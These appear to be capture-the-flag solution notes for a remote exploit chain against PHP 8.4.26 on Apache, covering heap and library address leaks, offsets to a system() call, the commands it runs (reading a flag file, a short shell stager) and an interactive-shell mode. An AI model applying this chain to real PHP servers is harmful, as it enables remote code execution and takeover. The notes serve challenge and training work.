# Solution notes

## Expected chain

Exact exploit request/response bytes can be archived with:

```sh
./solver/solve_remote.py http://challenge-host:8426 \
  --dump-requests out/request-dumps
```

See [request dumps](request-dumps.md) for the file format and hashes.

1. Fingerprint PHP 8.4.26 and confirm Apache `mod_php`.
2. Trigger the OOM/stale-state path.
3. Leak the Zend heap chunk base.
4. Leak the `libphp.so` load base through the destructor pointer.
5. Derive:

```text
HTDATA     = heap_base + 0x690d8
zif_system = libphp_base + 0x465370
```

6. Execute the fixed proof or shell stager.
7. Verify the proof without changing the PHP version or disabling ASLR.

## Fixed proof

Player command:

```sh
./solver/solve_remote.py http://challenge-host:8426

The runner reads `X-Powered-By` from the PHP response, selects a calibrated
profile automatically, and requires `--version` when that header is hidden.
```

The runtime executes:

```sh
cat /flag >/p
```

The runner fetches `/proof/p` and writes `php2shell-aslr-report.json`.

## Interactive shell

Player command:

```sh
./solver/solve_remote.py http://challenge-host:8426 --shell
```

The runtime executes the 12-byte stager:

```sh
sh /s #AAAAA
```

The shell is token-protected and communicates only over the existing HTTP
service. The client supports command execution, `cd` tracking, stdout/stderr,
and exit codes.

## Patched control

PHP 8.4.27 is the fixed comparison target. A version-aware runner should stop
with a fixed-release verdict before attempting stage 3.

## Troubleshooting

| Symptom | Likely cause | Action |
|---|---|---|
| Stage 1 misses | heap shape changed or worker state unstable | restart target and retry |
| Stage 2 misses | wrong symbol offset or stage-2 shape | recalibrate the exact image |
| Stage 3 crashes without proof | wrong HTDATA/layout | recalibrate stage 3 |
| Service stays alive | expected Apache parent behavior | inspect child PID/signals |
| `version no detectada, requiere --version` | `X-Powered-By` absent | rerun with the calibrated `--version` |
| `PHP x.y.z has no verified remote profile` | patched or uncalibrated target | use a calibrated lab image |

Do not disable ASLR to make the exploit work; that invalidates the challenge.
